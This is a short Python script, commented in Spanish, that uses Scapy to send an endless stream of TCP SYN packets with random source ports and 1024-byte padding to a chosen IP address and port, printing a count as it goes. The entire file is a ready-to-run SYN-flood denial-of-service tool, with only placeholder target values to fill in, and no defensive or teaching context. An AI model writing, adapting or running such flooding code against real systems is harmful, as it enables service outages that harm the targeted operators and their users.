from scapy.all import *
import asyncio # Arreglar p

ip_destino = "0.0.0.0" # IP destino a la que se dirigirán los paquetes
puerto_destino = 0 # Puerto por el que entraran los paquetes
ip = IP(dst=ip_destino)
contador_paquetes = 0 # Contar paquetes

async def enviar_paquetes(): # Bucle asincronico para printear los paquetes
    global contador_paquetes
    while True:
        contador_paquetes += 1  # Incrementamos el contador en cada iteración
        tcp = TCP(sport=RandShort(), dport=puerto_destino, flags="S")
        datos = Raw(b"X"*1024) # Datos enviados dentro del paquete
        p = ip / tcp / datos # Creacion del paquete
        send(p, verbose=0) # Envio del paquete
        print(f"Paquete enviado número {contador_paquetes}")  # Imprimimos el número del paquete
        await asyncio.sleep(0.01)  # Espera asincronica para poder enviar los paquetes printeandolo

if __name__ == "__main__": # Utilizamos if __name__ == "__main__": para asegurarnos de que el código dentro del bloque solo se ejecute cuando ejecutamos el script directamente
    loop = asyncio.get_event_loop()
    loop.run_until_complete(enviar_paquetes())